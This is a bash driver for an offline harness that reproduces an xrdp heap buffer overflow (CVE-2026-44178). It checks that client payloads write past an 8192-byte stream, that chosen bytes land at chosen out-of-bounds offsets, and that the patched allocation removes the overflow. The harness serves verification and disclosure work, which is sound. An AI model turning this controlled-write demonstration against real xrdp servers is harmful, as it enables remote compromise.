#!/usr/bin/env bash
# xrdp GHSA-hh7r-2rmq-q4g4 / CVE-2026-44178 file-only harness driver.
# No sockets, no xrdp library, no network: transcribed stream + sinks.
set -u
cd "$(dirname "$0")" || exit 1
mkdir -p logs
: > logs/summary.log

log() { printf '%s\n' "$*" | tee -a logs/summary.log; }
show() { sed 's/^/    /' "$1" | tee -a logs/summary.log; }
pass=1

record() { # record <desc> <expected-rc> <name> <cmd...>
    local desc="$1" want="$2" name="$3"; shift 3
    "$@" >"logs/$name.out" 2>&1
    local rc=$?
    log "--- $name: $desc (rc=$rc, want $want)"
    show "logs/$name.out"
    if [ "$rc" -ne "$want" ]; then pass=0; log "FAIL: $name rc=$rc want $want"; fi
}
expect() { # expect <file> <literal>
    if ! grep -Fq "$2" "$1"; then pass=0; log "FAIL: missing '$2' in $1"; fi
}

log "=== xrdp CVE-2026-44178 file-only harness ==="
log "workspace: $(pwd)"

gcc -O0 -g -Wall -Wextra -o vuln xrdp_overflow.c 2>logs/build-vuln.err
if [ $? -ne 0 ]; then show logs/build-vuln.err; log "FAIL: build vuln"; exit 1; fi
gcc -O0 -g -Wall -Wextra -DASAN_BUILD -fsanitize=address -o asan \
    xrdp_overflow.c 2>logs/build-asan.err
if [ $? -ne 0 ]; then show logs/build-asan.err; log "FAIL: build asan"; exit 1; fi

# Rung 1: client-chosen reassembled DYNVC payload overwrites past the 8192 stream.
record "28-byte header + 20000 client bytes overflow 8192 stream" 0 rung1 ./vuln rung1
expect logs/rung1.out 'header=28 copy_len=20000 oob_writes=11836 first_oob=8192 last_oob=20027'

# Static virtual channel path uses the same fixed-size stream with a 26-byte header.
record "static channel 26-byte header + 20000 bytes overflows too" 0 static ./vuln static
expect logs/static.out 'header=26 copy_len=20000 rc=0 oob_writes=11834 first_oob=8192 last_oob=20025'

# Rung 2: chosen client bytes at chosen OOB offsets.
record "chosen bytes land verbatim at OOB offsets 8228 and 12028" 0 rung2 ./vuln rung2
expect logs/rung2.out 'marker1=0xab at oob=8228 marker2=0xcd at oob=12028'

# Rung 3: ASan must fault on the real 8192-byte heap allocation.
ASAN_OPTIONS='detect_leaks=0:allocator_may_return_null=1:abort_on_error=0:halt_on_error=1' \
    ./asan rung3 >logs/rung3.out 2>&1
rc=$?
log "--- rung3: ASan heap-buffer-overflow at out_uint8a sink (rc=$rc, want 1)"
show logs/rung3.out
if [ "$rc" -ne 1 ] || ! grep -Fq 'heap-buffer-overflow' logs/rung3.out ||
   ! grep -Fq 'WRITE of size 20000' logs/rung3.out ||
   ! grep -Fq '8192-byte region' logs/rung3.out; then
    pass=0; log "FAIL: rung3 ASan signature"
fi

# Rung 4: two client messages place chosen bytes at chosen OOB offsets.
record "two client messages, two chosen markers, no sink special case" 0 rung4 ./vuln rung4
expect logs/rung4.out 'call1=0xde at oob=8228 call2=0xad at oob=12024 oob_writes=11832'

# Controls: 0.10.6.1 exact-size allocation and a benign short payload.
record "0.10.6.1 exact pdu_size allocation removes the overflow" 0 fixed ./vuln fixed
expect logs/fixed.out 'data_first_oob=0 data_oob=0 channel_rc=0 channel_oob=0'
record "benign 100-byte payload writes in-bounds" 0 benign ./vuln benign
expect logs/benign.out 'oob_writes=0'

# Repeatability: byte-identical vulnerable rung 1 traces.
: > logs/repeat.ref
./vuln rung1 > logs/repeat.ref 2>&1
repeat=1
for i in 1 2 3 4 5; do
    ./vuln rung1 > "logs/repeat.$i.out" 2>&1 || repeat=0
    cmp -s logs/repeat.ref "logs/repeat.$i.out" || repeat=0
done
if [ "$repeat" -eq 1 ]; then log "repeatability: 5/5 vulnerable rung1 traces byte-identical"
else pass=0; log "FAIL: repeatability"; fi

{
    sha256sum xrdp_overflow.c
    sha256sum run.sh
} > logs/digests.txt
log "--- pinned digests (logs/digests.txt)"
show logs/digests.txt

if [ "$pass" -eq 1 ]; then
    log "=== ALL CHECKS PASS ==="
else
    log "=== CHECKS FAILED ==="
fi
exit $((1 - pass))
